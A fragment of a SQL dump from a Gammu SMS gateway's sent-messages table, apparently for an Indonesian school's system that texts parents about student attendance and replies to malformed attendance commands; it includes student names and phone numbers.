('2019-11-10 02:53:02', '0000-00-00 00:00:00', '2019-11-10 02:53:02', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020006B0065006C00610073002000580049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310030002D004E006F00760065006D006200650072002D0032003000310039002000200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E0020004800610064006900720020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda IQBAL ALQODRI kelas XI.RPL. Pagi ini tanggal 10-November-2019  Absensinya dinyatakan Hadir ', 709, 'server', 1, 'SendingOKNoReport', -1, 80, 255, 'Gammu .128.90'),
('2019-11-10 02:00:53', '0000-00-00 00:00:00', '2019-11-10 02:00:53', NULL, '00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C00610073002000580049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100300020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda IQBAL ALQODRI Kelas XI.RPL  Keterangan Absensinya Hadir  Pada Tanggal 10 November 2019', 708, 'server', 1, 'SendingOKNoReport', -1, 79, 255, 'Gammu .128.90'),
('2019-11-09 19:02:25', '0000-00-00 00:00:00', '2019-11-09 19:02:25', NULL, '007900650073000D000A0020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'yes\r\n ', 702, 'server', 1, 'SendingOKNoReport', -1, 77, 255, 'Gammu .128.90'),
('2019-11-10 02:00:43', '0000-00-00 00:00:00', '2019-11-10 02:00:43', NULL, '00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C00610073002000580049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100300020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda IQBAL ALQODRI Kelas XI.RPL  Keterangan Absensinya Hadir  Pada Tanggal 10 November 2019', 707, 'server', 1, 'SendingOKNoReport', -1, 78, 255, 'Gammu .128.90'),
('2019-11-09 18:55:22', '0000-00-00 00:00:00', '2019-11-09 18:55:22', NULL, '00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003000370020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 07 November 2019', 701, 'server', 1, 'SendingOKNoReport', -1, 76, 255, 'Gammu .128.90'),
('2019-11-08 08:03:50', '0000-00-00 00:00:00', '2019-11-08 08:03:50', NULL, '00200061006E0061006E006400610020004E004F00560041004E00440041002000500052004100530045005400490059004100200042002E00410020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003000370020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda NOVANDA PRASETIYA B.A Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 07 November 2019', 700, 'server', 1, 'SendingOKNoReport', -1, 75, 255, 'Gammu .128.90'),
('2019-11-08 01:44:06', '0000-00-00 00:00:00', '2019-11-08 01:44:06', NULL, '00200061006E0061006E0064006100200020004B0065006C00610073002000200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E007900610020002000200050006100640061002000540061006E006700670061006C0020003000310020004A0061006E007500610072007900200031003900370030', '+6283139535224', 'Default_No_Compression', '', '+6281100000', -1, ' ananda  Kelas   Keterangan Absensinya   Pada Tanggal 01 January 1970', 698, 'server', 1, 'SendingOKNoReport', -1, 71, 255, 'Gammu .128.90'),
('2019-11-08 07:03:13', '0000-00-00 00:00:00', '2019-11-08 07:03:13', NULL, '00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003000370020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, ' ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 07 November 2019', 699, 'server', 1, 'SendingOKNoReport', -1, 74, 255, 'Gammu .128.90'),
('2019-11-08 01:22:48', '0000-00-00 00:00:00', '2019-11-08 01:22:48', NULL, '0069007100620061006C00200061006C0071006F006400720069000D000A000D000A0020', '081271198955', 'Default_No_Compression', '', '+6282282175993', -1, 'iqbal alqodri\r\n\r\n ', 696, 'server', 1, 'SendingOKNoReport', -1, 217, 255, 'Gammu .128.90'),
('2019-11-08 01:30:50', '0000-00-00 00:00:00', '2019-11-08 01:30:50', NULL, '00200061006E0061006E006400610020004100520049005300200046004100440049004C00410048002000540041004E004A0055004E00470020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003000370020004E006F00760065006D00620065007200200032003000310039', '+6281271198955', 'Default_No_Compression', '', '+002B003600320038003', -1, ' ananda ARIS FADILAH TANJUNG Kelas XII.RPL  Keterangan Absensinya Hadir  Pada Tanggal 07 November 2019', 697, 'server', 1, 'SendingError', -1, -1, 255, 'Gammu .128.90');
INSERT INTO `sentitems` (`UpdatedInDB`, `InsertIntoDB`, `SendingDateTime`, `DeliveryDateTime`, `Text`, `DestinationNumber`, `Coding`, `UDH`, `SMSCNumber`, `Class`, `TextDecoded`, `ID`, `SenderID`, `SequencePosition`, `Status`, `StatusError`, `TPMR`, `RelativeValidity`, `CreatorID`) VALUES
('2019-11-07 03:27:54', '0000-00-00 00:00:00', '2019-11-07 03:27:54', NULL, '004B00650074006500720061006E00670061006E0020003C007300650070006100730069003E0020006E0061006D00610020007300690073007700610020003C007300650070006100730069003E0020006B0065006C0061007300200073006900730077006100200063006F006E0074006F006800200028004B0065006C00610073002E006A00750072007500730061006E00290020003C007300650070006100730069003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D0068006100720069002900200020', '+6283139535224', 'Default_No_Compression', '', '+6282282175993', -1, 'Keterangan <sepasi> nama siswa <sepasi> kelas siswa contoh (Kelas.jurusan) <sepasi> tanggal dengan mengunakan format (tahun-bulan-hari)  ', 695, 'server', 1, 'SendingOKNoReport', -1, 216, 255, 'Gammu .128.90'),
('2019-11-06 15:35:19', '0000-00-00 00:00:00', '2019-11-06 15:35:19', NULL, '00200061006E0061006E0064006100200020004B0065006C00610073002000200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E007900610020002000200050006100640061002000540061006E006700670061006C0020003000310020004A0061006E007500610072007900200031003900370030', '+6282282175993', 'Default_No_Compression', '', '+6282282175993', -1, ' ananda  Kelas   Keterangan Absensinya   Pada Tanggal 01 January 1970', 689, 'server', 1, 'SendingOKNoReport', -1, 214, 255, 'Gammu .128.90'),
('2019-11-06 15:38:23', '0000-00-00 00:00:00', '2019-11-06 15:38:23', NULL, '00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E0079006100200049007A0069006E002000200050006100640061002000540061006E006700670061006C0020003000370020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6282282175993', -1, ' ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya Izin  Pada Tanggal 07 November 2019', 692, 'server', 1, 'SendingOKNoReport', -1, 215, 255, 'Gammu .128.90'),
('2019-11-06 15:21:47', '0000-00-00 00:00:00', '2019-11-06 15:21:47', NULL, '006B00650074006500720061006E00670061006E00200031003700300030003500300020007800690069002E00720070006C00200032003000310039002D00310031002D00300037', '082282175993', 'Default_No_Compression', '', '+6282282175993', -1, 'keterangan 170050 xii.rpl 2019-11-07', 687, 'server', 1, 'SendingOKNoReport', -1, 213, 255, 'Gammu .128.90'),
('2019-11-06 15:18:22', '0000-00-00 00:00:00', '2019-11-06 15:18:22', NULL, '00740065007300200062000D000A', '082282175993', 'Default_No_Compression', '', '+6282282175993', -1, 'tes b\r\n', 686, 'server', 1, 'SendingOKNoReport', -1, 212, 255, 'Gammu .128.90'),
('2019-11-13 03:01:30', '0000-00-00 00:00:00', '2019-11-13 03:01:30', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000700061006400610020005300690061006E006700200069006E006900200041006C00700061002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya pada Siang ini Alpa  Pada Tanggal 13 November 2019', 904, 'server', 1, 'SendingOKNoReport', -1, 141, 255, 'Gammu .128.90'),
('2019-11-13 03:11:34', '0000-00-00 00:00:00', '2019-11-13 03:11:34', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E0020006B006F00640065002000770061006B00740075002000310020003D00200070006100670069002C002000320020003D0020007300690061006E00670020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > kode waktu 1 = pagi, 2 = siang < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 905, 'server', 1, 'SendingOKNoReport', -1, 142, 255, 'Gammu .128.90'),
('2019-11-13 03:13:09', '0000-00-00 00:00:00', '2019-11-13 03:13:09', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E0020006B006F00640065002000770061006B0074007500200031003A0070006100670069002C0032003A007300690061006E00670020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > kode waktu 1:pagi,2:siang < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 906, 'server', 1, 'SendingOKNoReport', -1, 143, 255, 'Gammu .128.90'),
('2019-11-13 03:14:13', '0000-00-00 00:00:00', '2019-11-13 03:14:13', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E0020006B006F00640065002000770061006B0074007500200031003A007000610067006900200032003A007300690061006E00670020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > kode waktu 1:pagi 2:siang < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 907, 'server', 1, 'SendingOKNoReport', -1, 144, 255, 'Gammu .128.90'),
('2019-11-13 03:15:16', '0000-00-00 00:00:00', '2019-11-13 03:15:16', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E0020003C0020007300700061007300690020003E0020004E006900730020005300690073007700610020003C0020007300700061007300690020003E0020006B006F00640065002000770061006B007400750020003100200028007000610067006900290020003200200028007300690061006E006700290020003C0020007300700061007300690020003E002000740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen < spasi > Nis Siswa < spasi > kode waktu 1 (pagi) 2 (siang) < spasi > tanggal dengan mengunakan format (tahun-bulan-hari) ', 908, 'server', 1, 'SendingOKNoReport', -1, 145, 255, 'Gammu .128.90'),
('2019-11-13 03:17:50', '0000-00-00 00:00:00', '2019-11-13 03:17:50', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E003C0020007300700061007300690020003E004E00690073002000530069007300770061003C0020007300700061007300690020003E006B0064005F00770061006B0074007500200031002800700061006700690029002000320028007300690061006E00670029003C0020007300700061007300690020003E00740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen< spasi >Nis Siswa< spasi >kd_waktu 1(pagi) 2(siang)< spasi >tanggal dengan mengunakan format (tahun-bulan-hari) ', 909, 'server', 1, 'SendingOKNoReport', -1, 146, 255, 'Gammu .128.90'),
('2019-11-13 03:18:53', '0000-00-00 00:00:00', '2019-11-13 03:18:53', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E003C0020007300700061007300690020003E004E00690073002000530069007300770061003C0020007300700061007300690020003E006B0064005F00770061006B0074007500200031002000320020003C0020007300700061007300690020003E00740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen< spasi >Nis Siswa< spasi >kd_waktu 1 2 < spasi >tanggal dengan mengunakan format (tahun-bulan-hari) ', 910, 'server', 1, 'SendingOKNoReport', -1, 147, 255, 'Gammu .128.90'),
('2019-11-13 03:19:57', '0000-00-00 00:00:00', '2019-11-13 03:19:57', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E003C0020007300700061007300690020003E004E00690073002000530069007300770061003C0020007300700061007300690020003E00740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen< spasi >Nis Siswa< spasi >tanggal dengan mengunakan format (tahun-bulan-hari) ', 911, 'server', 1, 'SendingOKNoReport', -1, 148, 255, 'Gammu .128.90'),
('2019-11-13 03:26:32', '0000-00-00 00:00:00', '2019-11-13 03:26:32', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E003C0020007300700061007300690020003E004E00690073002000530069007300770061003C0020007300700061007300690020003E006B0064005F0077006B0074003100700061006700690032007300690061006E0067003C0020007300700061007300690020003E00740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen< spasi >Nis Siswa< spasi >kd_wkt1pagi2siang< spasi >tanggal dengan mengunakan format (tahun-bulan-hari) ', 912, 'server', 1, 'SendingOKNoReport', -1, 149, 255, 'Gammu .128.90'),
('2019-11-13 03:27:35', '0000-00-00 00:00:00', '2019-11-13 03:27:35', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E003C0020007300700061007300690020003E004E00690073002000530069007300770061003C0020007300700061007300690020003E006B0064005F0077006B007400200031003C0020007300700061007300690020003E00740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen< spasi >Nis Siswa< spasi >kd_wkt 1< spasi >tanggal dengan mengunakan format (tahun-bulan-hari) ', 913, 'server', 1, 'SendingOKNoReport', -1, 150, 255, 'Gammu .128.90'),
('2019-11-13 03:29:39', '0000-00-00 00:00:00', '2019-11-13 03:29:39', NULL, '0066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A0041006200730065006E003C0020007300700061007300690020003E004E00690073002000530069007300770061003C0020007300700061007300690020003E006B0064005F0077006B007400200031002C0032003C0020007300700061007300690020003E00740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D0061007400280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'format yang anda masukan salah silahkan ikuti format berikut:Absen< spasi >Nis Siswa< spasi >kd_wkt 1,2< spasi >tanggal dengan mengunakan format(tahun-bulan-hari) ', 914, 'server', 1, 'SendingOKNoReport', -1, 151, 255, 'Gammu .128.90'),
('2019-11-13 03:30:43', '0000-00-00 00:00:00', '2019-11-13 03:30:43', NULL, '0066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A0041006200730065006E003C0020007300700061007300690020003E004E00690073002000530069007300770061003C0020007300700061007300690020003E006B006400200077006B00740020003100200032003C0020007300700061007300690020003E00740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D0061007400280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'format yang anda masukan salah silahkan ikuti format berikut:Absen< spasi >Nis Siswa< spasi >kd wkt 1 2< spasi >tanggal dengan mengunakan format(tahun-bulan-hari) ', 915, 'server', 1, 'SendingOKNoReport', -1, 152, 255, 'Gammu .128.90'),
('2019-11-13 03:37:17', '0000-00-00 00:00:00', '2019-11-13 03:37:17', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E003C0020007300700061007300690020003E004E006900730020005300690073007700610020003C0020007300700061007300690020003E006B0064002000770061006B007400750020003100200070006100670069002000320020007300690061006E0067003C0020007300700061007300690020003E00740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D00680061007200690029', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen< spasi >Nis Siswa < spasi >kd waktu 1 pagi 2 siang< spasi >tanggal dengan mengunakan format (tahun-bulan-hari)', 916, 'server', 1, 'SendingOKNoReport', -1, 153, 255, 'Gammu .128.90'),
('2019-11-13 03:42:21', '0000-00-00 00:00:00', '2019-11-13 03:42:21', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E003C0020007300700061007300690020003E004E006900730020005300690073007700610020003C0020007300700061007300690020003E006B0064002000770061006B007400750020003100200070006100670069002000320020007300690061006E0067003C0020007300700061007300690020003E00740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D00680061007200690029', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen< spasi >Nis Siswa < spasi >kd waktu 1 pagi 2 siang< spasi >tanggal dengan mengunakan format (tahun-bulan-hari)', 917, 'server', 1, 'SendingOKNoReport', -1, 154, 255, 'Gammu .128.90'),
('2019-11-13 03:42:24', '0000-00-00 00:00:00', '2019-11-13 03:42:24', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A00200041006200730065006E003C0020007300700061007300690020003E004E006900730020005300690073007700610020003C0020007300700061007300690020003E006B0064002000770061006B007400750020003100200070006100670069002000320020007300690061006E0067003C0020007300700061007300690020003E00740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D00680061007200690029', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut: Absen< spasi >Nis Siswa < spasi >kd waktu 1 pagi 2 siang< spasi >tanggal dengan mengunakan format (tahun-bulan-hari)', 918, 'server', 1, 'SendingOKNoReport', -1, 155, 255, 'Gammu .128.90'),
('2019-11-13 03:49:28', '0000-00-00 00:00:00', '2019-11-13 03:49:28', NULL, '004D00610061006600200066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A0041006200730065006E003C00730070006100730069003E004E00690073002000530069007300770061003C00730070006100730069003E00740061006E006700670061006C002000640065006E00670061006E0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D00680061007200690020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf format yang anda masukan salah silahkan ikuti format berikut:Absen<spasi>Nis Siswa<spasi>tanggal dengan mengunakan format (tahun-bulan-hari ', 919, 'server', 1, 'SendingOKNoReport', -1, 156, 255, 'Gammu .128.90'),
('2019-11-13 03:54:01', '0000-00-00 00:00:00', '2019-11-13 03:54:01', NULL, '0066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A0041006200730065006E003C00730070006100730069003E004E00690073002000530069007300770061003C00730070006100730069003E006B0064005F0077006B00740020003100200070006100670069002000320020007300690061006E0067003C00730070006100730069003E00740061006E006700670061006C0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D00680061007200690029', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'format yang anda masukan salah silahkan ikuti format berikut:Absen<spasi>Nis Siswa<spasi>kd_wkt 1 pagi 2 siang<spasi>tanggal mengunakan format (tahun-bulan-hari)', 920, 'server', 1, 'SendingOKNoReport', -1, 157, 255, 'Gammu .128.90'),
('2019-11-13 03:55:06', '0000-00-00 00:00:00', '2019-11-13 03:55:06', NULL, '0066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A0041006200730065006E003C00730070006100730069003E004E00690073002000530069007300770061003C00730070006100730069003E006B0064005F0077006B00740031003A00700032003A0073003C00730070006100730069003E00740061006E006700670061006C0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'format yang anda masukan salah silahkan ikuti format berikut:Absen<spasi>Nis Siswa<spasi>kd_wkt1:p2:s<spasi>tanggal mengunakan format (tahun-bulan-hari) ', 921, 'server', 1, 'SendingOKNoReport', -1, 158, 255, 'Gammu .128.90'),
('2019-11-13 03:56:10', '0000-00-00 00:00:00', '2019-11-13 03:56:10', NULL, '0066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A0041006200730065006E003C00730070006100730069003E004E00690073002000530069007300770061003C00730070006100730069003E006B0064005F0077006B007400200031003A007000200032003A0073003C00730070006100730069003E00740061006E006700670061006C0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D006800610072006900290020', '082282175993', 'Default_No_Compression', '', '+6281100000', -1, 'format yang anda masukan salah silahkan ikuti format berikut:Absen<spasi>Nis Siswa<spasi>kd_wkt 1:p 2:s<spasi>tanggal mengunakan format (tahun-bulan-hari) ', 922, 'server', 1, 'SendingOKNoReport', -1, 159, 255, 'Gammu .128.90'),
('2019-11-13 03:57:44', '0000-00-00 00:00:00', '2019-11-13 03:57:44', NULL, '0066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A0041006200730065006E003C00730070006100730069003E004E00690073002000530069007300770061003C00730070006100730069003E006B0064005F0077006B007400200031003A007000200032003A0073003C00730070006100730069003E00740061006E006700670061006C0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D00680061007200690029', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'format yang anda masukan salah silahkan ikuti format berikut:Absen<spasi>Nis Siswa<spasi>kd_wkt 1:p 2:s<spasi>tanggal mengunakan format (tahun-bulan-hari)', 923, 'server', 1, 'SendingOKNoReport', -1, 160, 255, 'Gammu .128.90'),
('2019-11-13 03:58:49', '0000-00-00 00:00:00', '2019-11-13 03:58:49', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000700061006400610020007000610067006900200069006E0069002000480061006400690072002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya pada pagi ini Hadir  Pada Tanggal 13 November 2019', 924, 'server', 1, 'SendingOKNoReport', -1, 161, 255, 'Gammu .128.90'),
('2019-11-13 03:58:52', '0000-00-00 00:00:00', '2019-11-13 03:58:52', NULL, '004D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf akses di tolak', 925, 'server', 1, 'SendingOKNoReport', -1, 162, 255, 'Gammu .128.90'),
('2019-11-13 04:46:57', '0000-00-00 00:00:00', '2019-11-13 04:46:57', NULL, '004D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf akses di tolak', 926, 'server', 1, 'SendingOKNoReport', -1, 163, 255, 'Gammu .128.90'),
